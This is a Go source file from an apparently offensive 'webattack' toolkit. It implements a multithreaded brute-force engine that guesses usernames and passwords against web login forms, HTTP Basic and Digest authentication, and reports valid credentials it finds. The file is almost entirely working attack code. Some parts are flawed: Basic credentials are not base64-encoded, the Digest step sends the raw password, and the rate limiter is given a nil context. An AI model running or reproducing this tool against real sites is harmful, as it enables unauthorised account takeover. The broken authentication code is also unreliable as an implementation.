package brute

import (
	"fmt"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"webattack/pkg/httpclient"
	"webattack/pkg/payloads"

	"github.com/fatih/color"
	"golang.org/x/time/rate"
)

// TargetType defines the type of brute force target
type TargetType string

const (
	TargetForm   TargetType = "form"
	TargetBasic  TargetType = "basic-auth"
	TargetDigest TargetType = "digest-auth"
)

// Credential represents a username/password pair
type Credential struct {
	Username string
	Password string
}

// Result represents a successful login
type Result struct {
	Username   string
	Password   string
	Time       time.Duration
	ResponseLen int
}

// BruteForcer is the brute force engine
type BruteForcer struct {
	client    *httpclient.Client
	targetURL string
	targetType TargetType
	verbose   bool

	// Form-specific
	userField   string
	passField   string
	extraFields map[string]string
	successStr  string
	failStr     string

	// Rate limiting
	rateLimiter *rate.Limiter
	threads     int

	// Progress
	attempted int64
	total     int64
	found     []Result
	mu        sync.Mutex
}

// NewBruteForcer creates a new brute force engine
func NewBruteForcer(client *httpclient.Client, targetURL string, targetType TargetType, verbose bool) *BruteForcer {
	return &BruteForcer{
		client:      client,
		targetURL:   targetURL,
		targetType:  targetType,
		verbose:     verbose,
		rateLimiter: rate.NewLimiter(rate.Limit(10), 1), // 10 requests per second
		threads:     5,
		extraFields: make(map[string]string),
	}
}

// SetFormFields sets the form field names
func (b *BruteForcer) SetFormFields(userField, passField string) {
	b.userField = userField
	b.passField = passField
}

// SetExtraFields sets additional form fields
func (b *BruteForcer) SetExtraFields(fields map[string]string) {
	b.extraFields = fields
}

// SetSuccessIndicator sets a string that indicates successful login
func (b *BruteForcer) SetSuccessIndicator(s string) {
	b.successStr = s
}

// SetFailIndicator sets a string that indicates failed login
func (b *BruteForcer) SetFailIndicator(s string) {
	b.failStr = s
}

// SetThreads sets the number of concurrent threads
func (b *BruteForcer) SetThreads(n int) {
	if n < 1 {
		n = 1
	}
	if n > 50 {
		n = 50
	}
	b.threads = n
}

// SetRateLimit sets requests per second
func (b *BruteForcer) SetRateLimit(rps float64) {
	b.rateLimiter = rate.NewLimiter(rate.Limit(rps), 1)
}

// Attack starts the brute force attack
func (b *BruteForcer) Attack(usernames, passwords []string) ([]Result, error) {
	b.total = int64(len(usernames) * len(passwords))
	b.attempted = 0
	b.found = nil

	fmt.Printf("[*] Starting brute force attack...\n")
	fmt.Printf("[*] Target:     %s\n", b.targetURL)
	fmt.Printf("[*] Type:       %s\n", b.targetType)
	fmt.Printf("[*] Threads:    %d\n", b.threads)
	fmt.Printf("[*] Usernames:  %d\n", len(usernames))
	fmt.Printf("[*] Passwords:  %d\n", len(passwords))
	fmt.Printf("[*] Total combos: %d\n\n", b.total)

	startTime := time.Now()

	// Generate credential combinations
	creds := make(chan Credential, 100)
	var wg sync.WaitGroup

	// Worker pool
	for i := 0; i < b.threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range creds {
				b.rateLimiter.Wait(nil)
				b.tryLogin(cred)
			}
		}()
	}

	// Feed credentials
	for _, user := range usernames {
		for _, pass := range passwords {
			creds <- Credential{Username: user, Password: pass}
		}
	}
	close(creds)

	// Progress display
	progressDone := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				attempted := atomic.LoadInt64(&b.attempted)
				fmt.Printf("\r    Progress: %d/%d (%.1f%%)", attempted, b.total,
					float64(attempted)/float64(b.total)*100)
			case <-progressDone:
				return
			}
		}
	}()

	wg.Wait()
	progressDone <- struct{}{}

	elapsed := time.Since(startTime)
	fmt.Printf("\n\n[*] Attack completed in %v\n", elapsed)
	fmt.Printf("[*] Attempted: %d combinations\n", b.total)

	return b.found, nil
}

// tryLogin attempts a single login
func (b *BruteForcer) tryLogin(cred Credential) {
	atomic.AddInt64(&b.attempted, 1)

	start := time.Now()
	var resp *httpclient.Response
	var err error

	switch b.targetType {
	case TargetForm:
		resp, err = b.tryFormLogin(cred)
	case TargetBasic:
		resp, err = b.tryBasicAuth(cred)
	case TargetDigest:
		resp, err = b.tryDigestAuth(cred)
	}

	if err != nil {
		if b.verbose {
			fmt.Printf("\n    [ERR] %s:%s - %v\n", cred.Username, cred.Password, err)
		}
		return
	}

	bodyStr := string(resp.Body)
	elapsed := time.Since(start)

	// Check for success indicator
	if b.successStr != "" {
		if strings.Contains(bodyStr, b.successStr) {
			b.addResult(cred, elapsed, len(resp.Body), bodyStr)
			return
		}
	}
	// Check for fail indicator
	if b.failStr != "" {
		if !strings.Contains(bodyStr, b.failStr) {
			// Absence of fail string might indicate success
			b.addResult(cred, elapsed, len(resp.Body), bodyStr)
			return
		}
	}

	// Heuristic: 302 redirect often indicates successful login
	if resp.StatusCode == 302 {
		location := resp.Header.Get("Location")
		if location != "" && !strings.Contains(strings.ToLower(location), "login") &&
			!strings.Contains(strings.ToLower(location), "error") {
			b.addResult(cred, elapsed, len(resp.Body), bodyStr)
			return
		}
	}

	// Heuristic: 200 with different content length
	if b.verbose {
		fmt.Printf("\n    [TRY] %s:%s -> Status: %d, Len: %d\n",
			cred.Username, cred.Password, resp.StatusCode, len(resp.Body))
	}
}

// tryFormLogin attempts a form-based login
func (b *BruteForcer) tryFormLogin(cred Credential) (*httpclient.Response, error) {
	form := url.Values{}
	if b.userField != "" {
		form.Set(b.userField, cred.Username)
	} else {
		form.Set("username", cred.Username)
	}
	if b.passField != "" {
		form.Set(b.passField, cred.Password)
	} else {
		form.Set("password", cred.Password)
	}
	for k, v := range b.extraFields {
		form.Set(k, v)
	}

	return b.client.PostForm(b.targetURL, form)
}

// tryBasicAuth attempts HTTP Basic authentication
func (b *BruteForcer) tryBasicAuth(cred Credential) (*httpclient.Response, error) {
	req := b.client.NewRequest("GET", b.targetURL)
	req.SetHeader("Authorization", fmt.Sprintf("Basic %s:%s", cred.Username, cred.Password))
	return req.Do()
}

// tryDigestAuth attempts HTTP Digest authentication
func (b *BruteForcer) tryDigestAuth(cred Credential) (*httpclient.Response, error) {
	// First request to get the nonce
	resp, err := b.client.Get(b.targetURL)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 401 {
		return resp, nil
	}

	// Parse WWW-Authenticate header
	authHeader := resp.Header.Get("WWW-Authenticate")
	if !strings.HasPrefix(authHeader, "Digest ") {
		return resp, nil
	}

	// This is a simplified digest implementation
	// For production use, implement full RFC 2617 digest
	req := b.client.NewRequest("GET", b.targetURL)
	req.SetHeader("Authorization", fmt.Sprintf("Digest username=\"%s\", password=\"%s\"",
		cred.Username, cred.Password))
	return req.Do()
}

func (b *BruteForcer) addResult(cred Credential, elapsed time.Duration, respLen int, body string) {
	b.mu.Lock()
	defer b.mu.Unlock()

	result := Result{
		Username:    cred.Username,
		Password:    cred.Password,
		Time:        elapsed,
		ResponseLen: respLen,
	}
	b.found = append(b.found, result)

	fmt.Printf("\n")
	color.Green("    [SUCCESS] Username: %s | Password: %s | Time: %v | RespLen: %d\n",
		cred.Username, cred.Password, elapsed, respLen)

	_ = body
}

// PrintResults prints all findings
func PrintResults(results []Result) {
	if len(results) == 0 {
		color.Yellow("\n[!] No valid credentials found.")
		return
	}

	color.Green("\n╔══════════════════════════════════════════════════════════╗")
	color.Green("║              VALID CREDENTIALS FOUND                    ║")
	color.Green("╚══════════════════════════════════════════════════════════╝\n")

	for i, r := range results {
		fmt.Printf("[%d] Username: %s\n", i+1, r.Username)
		fmt.Printf("    Password:  %s\n", r.Password)
		fmt.Printf("    Time:      %v\n", r.Time)
		fmt.Println()
	}
}

// QuickBrute performs a quick brute force with built-in wordlists
func QuickBrute(client *httpclient.Client, targetURL string, targetType TargetType) ([]Result, error) {
	b := NewBruteForcer(client, targetURL, targetType, false)
	b.SetThreads(10)
	b.SetRateLimit(20)
	return b.Attack(payloads.CommonUsernames, payloads.CommonPasswords)
}
